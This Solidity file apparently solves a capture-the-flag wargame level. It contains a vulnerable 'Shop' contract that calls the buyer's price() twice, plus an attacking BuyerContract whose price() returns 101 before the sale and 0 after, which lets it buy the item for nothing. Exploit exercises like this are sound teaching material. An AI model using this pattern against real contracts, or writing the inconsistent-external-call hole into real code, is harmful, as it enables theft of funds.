// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract BuyerContract {
    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 101;
        }
        return 0;
    }
}
